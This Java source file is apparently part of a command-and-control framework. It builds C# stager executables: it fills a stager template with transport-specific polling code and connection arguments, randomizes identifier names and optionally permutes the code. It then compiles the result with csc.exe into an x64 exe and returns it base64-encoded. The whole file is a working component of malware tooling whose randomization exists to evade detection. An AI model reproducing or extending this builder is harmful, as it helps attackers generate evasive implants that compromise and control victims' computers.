package c2.csharp;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.List;
import java.util.Random;
import java.util.concurrent.TimeUnit;

public class StagerGenerator {

	public static final String ASSEMBLIES_PLACEHOLDER = "$ASSEMBLIES$";
	public static final String IMPORTS_PLACEHOLDER = "$IMPORTS$";
	public static final String POLLCODE_PLACEHOLDER = "$POLLCODE$";
	public static final String POLLCODE_FUNCTION_PLACEHOLDER = "$POLLCODE_FUNCTION$";

	private static String VARIABLE_PREDECATES[] = { "function_name_", "variable_pf_", "variable_pc_", "variable_" };

	public static final Path TEMPORARY_DISK_SRC_FILE = Paths.get("tmp_stager_file");
	public static final Path TEMPORARY_DISK_EXE_FILE = Paths.get("tmp_stager.exe");

	public static String generateStagerExe(Path configDirectory, String stagerType, List<String> connectionArgs, boolean permuteCode) throws IOException {
		String fileText;
		if(permuteCode) {
			fileText = generateStagedSourceFileWithRandomCode(configDirectory, stagerType, connectionArgs);
		}else {
			fileText = generateStagedSourceFile(configDirectory, stagerType, connectionArgs);
			//System.out.println(fileText);
		}
		Files.writeString(TEMPORARY_DISK_SRC_FILE, fileText);
		Process process = Runtime.getRuntime().exec(String.format(
				"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc /r:System.Net.Http.dll -target:exe -out:"
						+ TEMPORARY_DISK_EXE_FILE.toString() + " -platform:x64 \""
						+ TEMPORARY_DISK_SRC_FILE.toAbsolutePath() + "\""));
		try {
			if(!process.waitFor(30, TimeUnit.SECONDS)) {
				int availErrors = process.getErrorStream().available();
				if(availErrors > 0) {
					System.out.print("stderr: " + new String(process.getErrorStream().readNBytes(availErrors)));
				}
				int availOp = process.getInputStream().available();
				if(availOp > 0) {
					System.out.print("stdout: " + new String(process.getInputStream().readNBytes(availOp)));
				}
				
				throw new IOException("Unable to generate exe! This happens sometimes with the underlying system being not ready, try again and resubmit");	
			}
		} catch (InterruptedException e) {
			
		}
		String b64 = Base64.getEncoder().encodeToString(Files.readAllBytes(TEMPORARY_DISK_EXE_FILE));

		Files.delete(TEMPORARY_DISK_SRC_FILE);
		Files.delete(TEMPORARY_DISK_EXE_FILE);
		
		return b64;
	}
	
	public static String generateStagerExe(Path configDirectory, String stagerType, List<String> connectionArgs) throws IOException {
		return generateStagerExe(configDirectory, stagerType, connectionArgs, false);
	}

	public static String generateStagedSourceFileWithRandomCode(Path configDirectory, String stagerType, List<String> connectionArgs)  throws IOException{
		String baseCode = generateStagedSourceFile(configDirectory, stagerType, connectionArgs);
		return RandomCodePreprocessor.processFile(baseCode);
	}
	
	public static String generateStagedSourceFile(Path configDirectory, String stagerType, List<String> connectionArgs) throws IOException {
		String file = Files.readString(Paths.get(configDirectory.toAbsolutePath().toString(), "stager.cs"));
		Path assembliesPath = Paths.get(configDirectory.toAbsolutePath().toString(), "assemblies_" + stagerType);
		Path importsPath = Paths.get(configDirectory.toAbsolutePath().toString(), "imports_" + stagerType);
		Path pollcodePath = Paths.get(configDirectory.toAbsolutePath().toString(), "pollcode_" + stagerType);
		Path pollcodeFunctionPath = Paths.get(configDirectory.toAbsolutePath().toString(),
				"pollcode_function_" + stagerType);
		if (!Files.exists(assembliesPath) || !Files.exists(importsPath) || !Files.exists(pollcodePath)
				|| !Files.exists(pollcodeFunctionPath)) {
			throw new IOException(
					"Must have an assemblies_<transport type>, imports_<transport type>, pollcode_<transport type>, and pollcode_function_<transport type>");
		}
		String assemblies = Files.readString(assembliesPath);
		String imports = Files.readString(importsPath);
		String pollcode = Files.readString(pollcodePath);
		String pollcodeFunction = Files.readString(pollcodeFunctionPath);

		file = file.replace(ASSEMBLIES_PLACEHOLDER, assemblies);
		file = file.replace(IMPORTS_PLACEHOLDER, imports);
		file = file.replace(POLLCODE_PLACEHOLDER, pollcode);
		file = file.replace(POLLCODE_FUNCTION_PLACEHOLDER, pollcodeFunction);

		for (String root : VARIABLE_PREDECATES) {
			int counter = 1;
			String nextValue = "$" + root + counter + "$";
			while (file.contains(nextValue)) {
				String replacementValue = generateRandomLetterString();
				file = file.replace(nextValue, replacementValue);
				counter++;
				nextValue = "$" + root + counter + "$";
			}
		}

		String replacementValue = generateRandomLetterString();
		file = file.replace("$variable_source$", replacementValue);

		replacementValue = generateRandomLetterString();
		file = file.replace("$variable_parameters$", replacementValue);
		
		int idx = 1;
		for(String argument : connectionArgs) {
			file = file.replace("$connection_arg_" + idx + "$", argument);
			idx++;
		}

		return file;
	}

	public static String generateRandomLetterString() {
		int leftLimit = 65;
		int rightLimit = 122;
		Random random = new Random();
		int targetStringLength = 3 + random.nextInt(12);

		return random.ints(leftLimit, rightLimit + 1).filter(i -> (i <= 90 || i >= 97))// skip special chars
				.limit(targetStringLength)
				.collect(StringBuilder::new, StringBuilder::appendCodePoint, StringBuilder::append).toString();
	}
}
